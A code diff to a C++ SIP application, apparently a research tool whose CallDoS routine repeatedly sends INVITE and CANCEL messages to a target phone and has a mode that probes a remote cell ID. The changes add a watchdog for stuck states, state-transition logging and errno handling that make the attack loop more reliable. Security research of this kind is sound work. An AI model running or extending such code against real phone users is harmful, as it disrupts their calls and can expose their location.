@@ -7,6 +7,7 @@
 #include <fstream>
 #include <cstdlib>
 #include <regex>
+#include <cerrno>
 
 #include "application.h"
 
@@ -56,7 +57,7 @@ std::string Application::extractBranchFromSip(const std::string& sip) {
 }
 
 void Application::prepareFreshInvite(SipMessage& sip) {
-  session.currentSipState = SipState::INVITE;
+  session.setSipState(SipState::INVITE, "prepare fresh INVITE");
   sip.setBranch();
   sip.setCallId();
   sip.setFromTag();
@@ -760,7 +761,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
   prepareFreshInvite(front);
   armInviteTiming(front.invite);
   session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.invite.data()), front.invite.size()));
-  session.currentSipState = SipState::INVITE;
+  session.setSipState(SipState::INVITE, "initial probe INVITE sent");
 
   session.state.sessionProgressCount[calleeId] = 0;
 
@@ -770,6 +771,44 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
   std::vector<double> probeIntervals;
   std::thread inviteThread;
   bool expobackoff;
+  constexpr auto kTerminateWatchdog = std::chrono::seconds(10);
+  auto watchedState = session.currentSipState;
+  auto watchedStateAt = std::chrono::steady_clock::now();
+
+  auto noteStateTransition = [&]() {
+    if (session.currentSipState != watchedState) {
+      watchedState = session.currentSipState;
+      watchedStateAt = std::chrono::steady_clock::now();
+    }
+  };
+
+  auto applyTerminateWatchdog = [&]() {
+    if (session.currentSipState != SipState::CANCEL &&
+        session.currentSipState != SipState::REQUESTERMINATE) {
+      return;
+    }
+
+    const auto elapsed = std::chrono::steady_clock::now() - watchedStateAt;
+    if (elapsed < kTerminateWatchdog) return;
+
+    if (session.currentSipState == SipState::CANCEL) {
+      if (util::context.verbose) {
+        std::cout << "[watchdog] CANCEL stuck >10s, forcing retry path" << std::endl;
+      }
+      session.state.retryCancelPending = true;
+      session.state.retryInvitePending = false;
+      session.setSipState(SipState::BUSY, "watchdog: cancel stuck");
+    } else {
+      if (util::context.verbose) {
+        std::cout << "[watchdog] REQUESTERMINATE stuck >10s, forcing fresh INVITE" << std::endl;
+      }
+      session.state.retryCancelPending = false;
+      session.state.retryInvitePending = true;
+      session.setSipState(SipState::BUSY, "watchdog: request terminate stuck");
+    }
+    noteStateTransition();
+  };
+
   while (true) {
     if (!handleIncomingPackets(nReady)) {
       // force immediate retry if we got a transport error
@@ -781,16 +820,18 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
     if (nReady == 0 &&
         session.currentSipState == SipState::REQUESTERMINATE &&
         session.state.retryInvitePending) {
-      session.currentSipState = SipState::BUSY;
+      session.setSipState(SipState::BUSY, "terminate timeout fallback");
     }
 
+    noteStateTransition();
+    applyTerminateWatchdog();
 
     if (nReady >= 0) {
       // If a retry was requested (e.g., 486/500/408), route into BUSY handling.
       if (session.state.retryImmediate) {
         session.state.retryImmediate = false;
         session.state.retryCancelPending = true;
-        session.currentSipState = SipState::BUSY;
+        session.setSipState(SipState::BUSY, "retryImmediate requested");
       }
       // Send SIP INVITE and CANCEL
       switch (session.currentSipState) {
@@ -801,7 +842,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
 
 
 
-          session.currentSipState = SipState::PRACK;
+          session.setSipState(SipState::PRACK, "session progress received");
 
           if (util::context.remoteCellIDProber) {
             session.currentSipApp = SipApp::DOS;
@@ -813,7 +854,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
        
             session.state.sessionProgressCount[session.state.calleeId] = 0;
      
-            session.currentSipState = SipState::INVITE;
+            session.setSipState(SipState::INVITE, "threshold reached, rollover to next INVITE");
             if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
             session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
 
@@ -823,7 +864,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
               prepareFreshInvite(back);
               armInviteTiming(back.invite);
               session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
-              session.currentSipState = SipState::INVITE;
+              session.setSipState(SipState::INVITE, "fresh INVITE sent after rollover");
             }
 
             // Create new sip call session
@@ -835,6 +876,14 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
                 
           }
           break;
+        case SipState::CANCEL:
+          // Normal probe path: terminate current INVITE leg before rotating.
+          if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
+          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
+          session.state.retryCancelPending = false;
+          session.state.retryInvitePending = true;
+          session.setSipState(SipState::REQUESTERMINATE, "cancel sent for normal termination");
+          break;
         case SipState::BUSY:
           // Two-phase timeout/busy retry to avoid overlapping old/new INVITE legs.
           if (session.state.retryCancelPending) {
@@ -842,7 +891,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
             session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
             session.state.retryCancelPending = false;
             session.state.retryInvitePending = true;
-            session.currentSipState = SipState::REQUESTERMINATE;
+            session.setSipState(SipState::REQUESTERMINATE, "cancel sent for retry");
             break;
           }
 
@@ -851,7 +900,7 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
             prepareFreshInvite(back);
             armInviteTiming(back.invite);
             session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
-            session.currentSipState = SipState::INVITE;
+            session.setSipState(SipState::INVITE, "fresh INVITE sent for retry");
 
             // Prepare next rotation of front/back
             front.setBranch();
@@ -868,12 +917,13 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
             writeProbeTimeCDFToFile(probeIntervals, "probe_time_cdf.txt");
           
             lastProbeTime = now;
-            session.currentSipState = SipState::END;
+            session.setSipState(SipState::END, "ACK completed");
           
           break;
         default:
           break;
       }
+      noteStateTransition();
     }
     nReady = poll(&pfd, 1, 5000);
   }
@@ -939,10 +989,17 @@ void Application::CallDetect(pollfd& pfd, int nReady, const std::string& calleeI
 
 
 bool Application::handleIncomingPackets(const int nReady) {
-  if ((nReady < 0 && errno != EINTR) || util::context.shouldStop) return false;
+  if (util::context.shouldStop) return false;
+  if (nReady < 0) {
+    if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) return true;
+    return false;
+  }
   if (nReady > 0) {
     ssize_t readCount = read(session.sock, session.recvBuffer, sizeof(session.recvBuffer));
-    if (readCount < 0) return false;
+    if (readCount < 0) {
+      if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) return true;
+      return false;
+    }
     session.state.ack = false;
     session.dissect(readCount);
     if (session.currentSipState != SipState::IDLE && session.state.ack) {
